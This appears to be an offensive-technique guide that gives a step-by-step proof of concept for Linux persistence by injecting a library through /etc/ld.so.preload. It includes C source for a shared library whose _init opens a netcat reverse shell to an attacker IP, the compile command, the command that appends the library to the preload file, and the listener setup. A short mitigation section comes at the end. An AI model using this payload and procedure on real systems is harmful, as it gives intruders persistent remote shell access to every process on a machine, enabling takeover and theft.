# Library Injection via `/etc/ld.so.preload` File

This technique exploits the `/etc/ld.so.preload` file on Linux systems to inject custom libraries for code execution and persistence across reboots.

---

### Description

This attack leverages the `/etc/ld.so.preload` file to inject a shared library that gets loaded with every dynamically linked process. By adding a custom library path to `/etc/ld.so.preload`, an attacker can execute arbitrary code whenever any new process is started.

- **How it works**: The dynamic linker (`ld.so`) checks `/etc/ld.so.preload` during system startup and loads any libraries listed there before the standard libraries. This allows attackers to run malicious code with the privileges of the calling process.

- **Impact**: Attackers with escalated privileges can use this method for privilege escalation, data exfiltration, or to silently execute malicious activities. This persistence method survives system reboots and user logins as long as the malicious library remains in the specified path and `/etc/ld.so.preload` is not modified.

---

## Detailed Proof of Concept (PoC)

Let’s break down the steps to exploit this technique, including preparation, library creation, injection into `/etc/ld.so.preload`, and execution.

### Step 1: Understanding the Exploit

- **Objective**: Achieve persistence on a Linux system by injecting a malicious shared library using `/etc/ld.so.preload`.

- **Mechanism**: The dynamic linker (`ld.so`) checks `/etc/ld.so.preload` during system startup and loads any libraries listed there. An attacker can modify this file to execute arbitrary code when any process starts.

---

### Step 2: Creating a Malicious Shared Library

First, create a custom shared library that will be injected into processes. This library can contain malicious code, such as a reverse shell, keylogger, or other persistent malware.

#### Code for a Malicious Shared Library (Example: Reverse Shell)

```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>

void _init() {
    // The reverse shell payload: connects to an attacker-controlled IP and port
    const char *ip = "attacker_ip_here";  // Replace with attacker's IP
    const int port = 4444;                // Replace with desired port

    char command[128];
    snprintf(command, sizeof(command), "nc %s %d -e /bin/bash", ip, port);

    // Execute the reverse shell
    system(command);
}

Steps to compile the malicious shared library:

Save the above code into a file called reverse_shell.c.
Compile it into a shared library:
```bash
gcc -shared -fPIC -o reverse_shell.so reverse_shell.c
```
This creates the reverse_shell.so shared library, which will execute a reverse shell to the attacker's IP and port when any process is started.

### Step 3: Modifying /etc/ld.so.preload
Once the malicious shared library is compiled, the next step is to modify the /etc/ld.so.preload file to ensure that the malicious library is loaded system-wide whenever a process starts.

#### 1. Check if /etc/ld.so.preload exists:

If the file already exists, you'll append your library path to it. If it doesn't exist, you’ll need to create it.

2. Gain root access:

Since modifying /etc/ld.so.preload requires root privileges, you’ll need to escalate privileges to root if not already done. This could be through an existing vulnerability, misconfiguration, or a privilege escalation exploit.

3. Modify /etc/ld.so.preload:

Assuming you've gained root access, you can modify /etc/ld.so.preload by appending the path of the malicious shared library:

echo "/path/to/reverse_shell.so" >> /etc/ld.so.preload
Make sure to replace /path/to/reverse_shell.so with the actual path to your malicious shared library.

### Step 4: Test the Exploit
At this point, the malicious library is set to be loaded every time any dynamically linked process starts. To test the exploit, simply start a new process. For example, try running:

ls
This will run the ls command, but because of the /etc/ld.so.preload file, the reverse shell library will be loaded first, and it will attempt to connect to the attacker's machine.

### Step 5: Set up Listener on Attacker's Machine
To receive the reverse shell, you need to set up a listener on the attacker's machine using Netcat (nc). On your attacker's machine:

nc -lvp 4444
Make sure that port 4444 (or whatever port you specified) is open and listening for connections.

### Step 6: Persistent Execution
Since /etc/ld.so.preload is applied system-wide, this technique will survive reboots and user logins as long as the malicious library remains in the specified path and /etc/ld.so.preload is not modified. This gives the attacker full persistence on the system.

### Step 7: Cleanup and Mitigation
To remove the malicious payload, you would simply need to:

Remove the entry from /etc/ld.so.preload:

sed -i '/reverse_shell.so/d' /etc/ld.so.preload
Delete the malicious shared library:

rm /path/to/reverse_shell.so
Restart the system or relaunch processes to ensure the payload is no longer injected.

# Additional Considerations and Mitigation
### Security Measures:

Restrict write access to /etc/ld.so.preload and other critical system files.
Use tools like SELinux, AppArmor, or other mandatory access control (MAC) systems to limit the impact of privilege escalation attacks.
Ensure that only trusted users can modify the system's library paths and execute dynamic binaries.
Regularly audit the /etc/ld.so.preload file to ensure there are no unauthorized entries.
Monitoring:

Set up monitoring for system changes to /etc/ld.so.preload to detect tampering.
Monitor network activity, particularly outgoing connections to detect suspicious reverse shell connections.

